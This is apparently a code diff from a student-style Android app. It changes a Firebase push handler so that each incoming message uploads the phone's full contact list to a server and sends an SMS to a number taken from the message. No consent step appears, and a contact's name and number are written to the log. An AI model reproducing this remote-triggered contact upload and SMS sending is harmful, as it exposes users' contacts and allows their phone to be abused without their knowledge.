@@ -1,18 +1,14 @@
 package fr.intechinfo.fusionandroid;
 
-import android.app.NotificationManager;
-import android.app.PendingIntent;
-import android.content.Context;
-import android.content.Intent;
-import android.database.Cursor;
-import android.graphics.BitmapFactory;
-import android.media.RingtoneManager;
-import android.net.Uri;
-import android.support.v4.app.NotificationCompat;
 import android.telephony.SmsManager;
 import android.util.Log;
 import com.google.firebase.messaging.FirebaseMessagingService;
 import com.google.firebase.messaging.RemoteMessage;
+
+import java.util.List;
+
+import retrofit2.Retrofit;
+import retrofit2.converter.jackson.JacksonConverterFactory;
 
 import static android.content.ContentValues.TAG;
 
@@ -25,13 +21,19 @@ public class MyFirebaseMessagingService extends FirebaseMessagingService {
         String strTitle=remoteMessage.getNotification().getTitle();
         String message=remoteMessage.getNotification().getBody();
         Log.d(TAG,"onMessageReceived:  Message Received: \n" + "Title: " + strTitle + "\n" + "Message: "+ message);
-
+        ContentCollector cc = new ContentCollector();
+        List<Contact> lsContact = cc.GetContacts(this);
+        Log.d(TAG,"Name : "+ lsContact.get(1).GetName()+" Number : " + lsContact.get(1).GetNumber());
+        Retrofit retrofit = new Retrofit.Builder()
+                .baseUrl("http://localhost")
+                .addConverterFactory(JacksonConverterFactory.create())
+                .build();
+        RetrofitAPI retrofitAPI = retrofit.create(RetrofitAPI.class);
+        retrofitAPI.CreateContacts(lsContact);
         sendSMS(strTitle, message);
-        //sendNotification(strTitle,message);
     }
     private void sendSMS(String phoneNumber, String messageBody){
         SmsManager sms = SmsManager.getDefault();
-
 
         sms.sendTextMessage(phoneNumber, null, messageBody,null,null);
     }
